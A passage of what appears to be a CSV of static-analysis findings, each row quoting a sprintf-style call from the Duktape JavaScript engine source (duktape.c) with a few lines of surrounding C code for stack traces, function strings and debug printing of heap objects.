					duk_push_sprintf(thr, ""at %s (%s) native%s%s%s%s%s"",
					                 (const char *) funcname,
					                 (const char *) filename,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""at %s (%s:%lu)%s%s%s%s%s"",",120,1,"					                 (const char *) ((flags & DUK_ACT_FLAG_PREVENT_YIELD) ? str_prevyield : str_empty));
				} else {
					duk_push_sprintf(thr, ""at %s (%s:%lu)%s%s%s%s%s"",
					                 (const char *) funcname,
					                 (const char *) filename,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""at [anon] (%s:%ld) internal"",",120,1,"				 */
				str_file = (const char *) duk_get_string(thr, -2);
				duk_push_sprintf(thr, ""at [anon] (%s:%ld) internal"",
				                 (const char *) (str_file ? str_file : ""null""), (long) pc);
				duk_replace(thr, -3);  /* [ ... v1 v2 str ] -> [ ... str v2 ] */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""function %s() { [ecmascript code] }"", (const char *) func_name);",120,1,"
		if (DUK_HOBJECT_IS_COMPFUNC(obj)) {
			duk_push_sprintf(thr, ""function %s() { [ecmascript code] }"", (const char *) func_name);
		} else if (DUK_HOBJECT_IS_NATFUNC(obj)) {
			duk_push_sprintf(thr, ""function %s() { [native code] }"", (const char *) func_name);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""function %s() { [native code] }"", (const char *) func_name);",120,1,"			duk_push_sprintf(thr, ""function %s() { [ecmascript code] }"", (const char *) func_name);
		} else if (DUK_HOBJECT_IS_NATFUNC(obj)) {
			duk_push_sprintf(thr, ""function %s() { [native code] }"", (const char *) func_name);
		} else if (DUK_HOBJECT_IS_BOUNDFUNC(obj)) {
			duk_push_sprintf(thr, ""function %s() { [bound code] }"", (const char *) func_name);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""function %s() { [bound code] }"", (const char *) func_name);",120,1,"			duk_push_sprintf(thr, ""function %s() { [native code] }"", (const char *) func_name);
		} else if (DUK_HOBJECT_IS_BOUNDFUNC(obj)) {
			duk_push_sprintf(thr, ""function %s() { [bound code] }"", (const char *) func_name);
		} else {
			goto type_error;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, DUK_STR_FMT_PTR, (void *) h_target);",120,1,"		js_ctx->visiting[js_ctx->recursion_depth] = h_target;
	} else {
		duk_push_sprintf(thr, DUK_STR_FMT_PTR, (void *) h_target);
		duk_dup_top(thr);  /* -> [ ... voidp voidp ] */
		if (duk_has_prop(thr, js_ctx->idx_loop)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK_INTERNAL void duk_fb_sprintf(duk_fixedbuffer *fb, const char *fmt, ...) {",120,1,"}

DUK_INTERNAL void duk_fb_sprintf(duk_fixedbuffer *fb, const char *fmt, ...) {
	duk_size_t avail;
	va_list ap;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""(%p)"", (void *) h);",120,1,"
	if (st->heavy) {
		duk_fb_sprintf(fb, ""(%p)"", (void *) h);
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%02lx"", (unsigned long) ((duk_uint8_t *)h)[i]);",120,1,"		duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_LBRACKET);
		for (i = 0; i < (duk_size_t) sizeof(*h); i++) {
			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) ((duk_uint8_t *)h)[i]);
		}
		duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_RBRACKET);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[h_next=%p,h_prev=%p,h_refcount=%lu,h_flags=%08lx,type=%ld,""",120,1,"#if defined(DUK_USE_REFERENCE_COUNTING)  /* currently implicitly also DUK_USE_DOUBLE_LINKED_HEAP */
	if (st->heavy) {
		duk_fb_sprintf(fb, ""[h_next=%p,h_prev=%p,h_refcount=%lu,h_flags=%08lx,type=%ld,""
		               ""reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",
		               (void *) DUK_HEAPHDR_GET_NEXT(NULL, h),
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[h_next=%p,h_flags=%08lx,type=%ld,reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",",120,1,"#else
	if (st->heavy) {
		duk_fb_sprintf(fb, ""[h_next=%p,h_flags=%08lx,type=%ld,reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",
		               (void *) DUK_HEAPHDR_GET_NEXT(NULL, h),
		               (unsigned long) DUK_HEAPHDR_GET_FLAGS(h),
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[h_refcount=%lu,h_flags=%08lx,type=%ld,reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",",120,1,"#if defined(DUK_USE_REFERENCE_COUNTING)
	if (st->heavy) {
		duk_fb_sprintf(fb, ""[h_refcount=%lu,h_flags=%08lx,type=%ld,reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",
		               (unsigned long) DUK_HEAPHDR_GET_REFCOUNT((duk_heaphdr *) h),
		               (unsigned long) DUK_HEAPHDR_GET_FLAGS((duk_heaphdr *) h),
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[h_flags=%08lx,type=%ld,reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",",120,1,"#else
	if (st->heavy) {
		duk_fb_sprintf(fb, ""[h_flags=%08lx,type=%ld,reachable=%ld,temproot=%ld,finalizable=%ld,finalized=%ld]"",
		               (unsigned long) DUK_HEAPHDR_GET_FLAGS((duk_heaphdr *) h),
		               (long) DUK_HEAPHDR_GET_TYPE((duk_heaphdr *) h),
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""\\\\"");",120,1,"		/* two special escapes: '\' and '""', other printables as is */
		if (ch == '\\') {
			duk_fb_sprintf(fb, ""\\\\"");
		} else if (ch == '""') {
			duk_fb_sprintf(fb, ""\\\"""");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""\\\"""");",120,1,"			duk_fb_sprintf(fb, ""\\\\"");
		} else if (ch == '""') {
			duk_fb_sprintf(fb, ""\\\"""");
		} else if (ch >= 0x20 && ch <= 0x7e) {
			duk_fb_put_byte(fb, ch);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""\\x%02lx"", (unsigned long) ch);",120,1,"			duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_UNDERSCORE);
		} else {
			duk_fb_sprintf(fb, ""\\x%02lx"", (unsigned long) ch);
		}
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""/%lu"", (unsigned long) DUK_HEAPHDR_GET_REFCOUNT(&h->hdr));",120,1,"#if defined(DUK_USE_REFERENCE_COUNTING)
	/* XXX: limit to quoted strings only, to save keys from being cluttered? */
	duk_fb_sprintf(fb, ""/%lu"", (unsigned long) DUK_HEAPHDR_GET_REFCOUNT(&h->hdr));
#endif
}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%sobject/%s %p%s"", (const char *) brace1, subtype, (void *) h, (const char *) brace2);",120,1,"			subtype = ""array"";
		}
		duk_fb_sprintf(fb, ""%sobject/%s %p%s"", (const char *) brace1, subtype, (void *) h, (const char *) brace2);
		return;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%sLOOP:%p%s"", (const char *) brace1, (void *) h, (const char *) brace2);",120,1,"	for (i = 0; i < (duk_uint_fast32_t) st->loop_stack_index; i++) {
		if (st->loop_stack[i] == h) {
			duk_fb_sprintf(fb, ""%sLOOP:%p%s"", (const char *) brace1, (void *) h, (const char *) brace2);
			return;
		}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%sOUT-OF-LOOP-STACK%s"", (const char *) brace1, (const char *) brace2);",120,1,"
	if (st->loop_stack_index >= st->loop_stack_limit) {
		duk_fb_sprintf(fb, ""%sOUT-OF-LOOP-STACK%s"", (const char *) brace1, (const char *) brace2);
		goto finished;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[get:%p,set:%p]"",",120,1,"			duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_COLON);
			if (DUK_HOBJECT_E_SLOT_IS_ACCESSOR(NULL, h, i)) {
				duk_fb_sprintf(fb, ""[get:%p,set:%p]"",
				               (void *) DUK_HOBJECT_E_GET_VALUE(NULL, h, i).a.get,
				               (void *) DUK_HOBJECT_E_GET_VALUE(NULL, h, i).a.set);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""<%02lx>"", (unsigned long) DUK_HOBJECT_E_GET_FLAGS(NULL, h, i));",120,1,"			}
			if (st->heavy) {
				duk_fb_sprintf(fb, ""<%02lx>"", (unsigned long) DUK_HOBJECT_E_GET_FLAGS(NULL, h, i));
			}
		}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__array:true"");",120,1,"	if (st->internal) {
		if (DUK_HOBJECT_IS_ARRAY(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__array:true"");
		}
		if (DUK_HOBJECT_HAS_EXTENSIBLE(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__extensible:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_EXTENSIBLE(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__extensible:true"");
		}
		if (DUK_HOBJECT_HAS_CONSTRUCTABLE(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__constructable:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_CONSTRUCTABLE(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__constructable:true"");
		}
		if (DUK_HOBJECT_HAS_BOUNDFUNC(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__boundfunc:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_BOUNDFUNC(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__boundfunc:true"");
		}
		if (DUK_HOBJECT_HAS_COMPFUNC(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__compfunc:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_COMPFUNC(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__compfunc:true"");
		}
		if (DUK_HOBJECT_HAS_NATFUNC(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__natfunc:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_NATFUNC(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__natfunc:true"");
		}
		if (DUK_HOBJECT_HAS_BUFOBJ(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__bufobj:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_BUFOBJ(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__bufobj:true"");
		}
		if (DUK_HOBJECT_IS_THREAD(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:true"");",120,1,"		}
		if (DUK_HOBJECT_IS_THREAD(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:true"");
		}
		if (DUK_HOBJECT_HAS_ARRAY_PART(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__array_part:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_ARRAY_PART(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__array_part:true"");
		}
		if (DUK_HOBJECT_HAS_STRICT(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_STRICT(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:true"");
		}
		if (DUK_HOBJECT_HAS_NOTAIL(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__notail:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_NOTAIL(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__notail:true"");
		}
		if (DUK_HOBJECT_HAS_NEWENV(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__newenv:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_NEWENV(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__newenv:true"");
		}
		if (DUK_HOBJECT_HAS_NAMEBINDING(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__namebinding:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_NAMEBINDING(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__namebinding:true"");
		}
		if (DUK_HOBJECT_HAS_CREATEARGS(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__createargs:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_CREATEARGS(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__createargs:true"");
		}
		if (DUK_HOBJECT_HAS_EXOTIC_ARRAY(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_array:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_EXOTIC_ARRAY(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_array:true"");
		}
		if (DUK_HOBJECT_HAS_EXOTIC_STRINGOBJ(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_stringobj:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_EXOTIC_STRINGOBJ(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_stringobj:true"");
		}
		if (DUK_HOBJECT_HAS_EXOTIC_ARGUMENTS(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_arguments:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_EXOTIC_ARGUMENTS(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_arguments:true"");
		}
		if (DUK_HOBJECT_IS_BUFOBJ(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_bufobj:true"");",120,1,"		}
		if (DUK_HOBJECT_IS_BUFOBJ(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_bufobj:true"");
		}
		if (DUK_HOBJECT_HAS_EXOTIC_PROXYOBJ(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_proxyobj:true"");",120,1,"		}
		if (DUK_HOBJECT_HAS_EXOTIC_PROXYOBJ(h)) {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__exotic_proxyobj:true"");
		}
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) a->length);",120,1,"	if (st->internal && DUK_HOBJECT_IS_ARRAY(h)) {
		duk_harray *a = (duk_harray *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) a->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length_nonwritable:%ld"", (long) a->length_nonwritable);
	} else if (st->internal && DUK_HOBJECT_IS_COMPFUNC(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__length_nonwritable:%ld"", (long) a->length_nonwritable);",120,1,"		duk_harray *a = (duk_harray *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) a->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length_nonwritable:%ld"", (long) a->length_nonwritable);
	} else if (st->internal && DUK_HOBJECT_IS_COMPFUNC(h)) {
		duk_hcompfunc *f = (duk_hcompfunc *) h;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__nregs:%ld"", (long) f->nregs);",120,1,"		DUK__COMMA(); duk_fb_put_cstring(fb, ""__lexenv:""); duk__print_hobject(st, DUK_HCOMPFUNC_GET_LEXENV(NULL, f));
		DUK__COMMA(); duk_fb_put_cstring(fb, ""__varenv:""); duk__print_hobject(st, DUK_HCOMPFUNC_GET_VARENV(NULL, f));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nregs:%ld"", (long) f->nregs);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
#if defined(DUK_USE_DEBUGGER_SUPPORT)
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);",120,1,"		DUK__COMMA(); duk_fb_put_cstring(fb, ""__varenv:""); duk__print_hobject(st, DUK_HCOMPFUNC_GET_VARENV(NULL, f));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nregs:%ld"", (long) f->nregs);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
#if defined(DUK_USE_DEBUGGER_SUPPORT)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__start_line:%ld"", (long) f->start_line);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__start_line:%ld"", (long) f->start_line);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
#if defined(DUK_USE_DEBUGGER_SUPPORT)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__start_line:%ld"", (long) f->start_line);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__end_line:%ld"", (long) f->end_line);
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__end_line:%ld"", (long) f->end_line);",120,1,"#if defined(DUK_USE_DEBUGGER_SUPPORT)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__start_line:%ld"", (long) f->start_line);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__end_line:%ld"", (long) f->end_line);
#endif
		DUK__COMMA(); duk_fb_put_cstring(fb, ""__data:"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__func:"");",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_NATFUNC(h)) {
		duk_hnatfunc *f = (duk_hnatfunc *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__func:"");
		duk_fb_put_funcptr(fb, (duk_uint8_t *) &f->func, sizeof(f->func));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__magic:%ld"", (long) f->magic);",120,1,"		duk_fb_put_funcptr(fb, (duk_uint8_t *) &f->func, sizeof(f->func));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__magic:%ld"", (long) f->magic);
	} else if (st->internal && DUK_HOBJECT_IS_DECENV(h)) {
		duk_hdecenv *e = (duk_hdecenv *) h;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_DECENV(h)) {
		duk_hdecenv *e = (duk_hdecenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);",120,1,"		duk_hdecenv *e = (duk_hdecenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);
	} else if (st->internal && DUK_HOBJECT_IS_OBJENV(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);
	} else if (st->internal && DUK_HOBJECT_IS_OBJENV(h)) {
		duk_hobjenv *e = (duk_hobjenv *) h;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__target:""); duk__print_hobject(st, (duk_hobject *) e->target);",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_OBJENV(h)) {
		duk_hobjenv *e = (duk_hobjenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:""); duk__print_hobject(st, (duk_hobject *) e->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__has_this:%ld"", (long) e->has_this);
#if defined(DUK_USE_BUFFEROBJECT_SUPPORT)
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__has_this:%ld"", (long) e->has_this);",120,1,"		duk_hobjenv *e = (duk_hobjenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:""); duk__print_hobject(st, (duk_hobject *) e->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__has_this:%ld"", (long) e->has_this);
#if defined(DUK_USE_BUFFEROBJECT_SUPPORT)
	} else if (st->internal && DUK_HOBJECT_IS_BUFOBJ(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__buf:"");",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_BUFOBJ(h)) {
		duk_hbufobj *b = (duk_hbufobj *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf:"");
		duk__print_hbuffer(st, (duk_hbuffer *) b->buf);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");
"
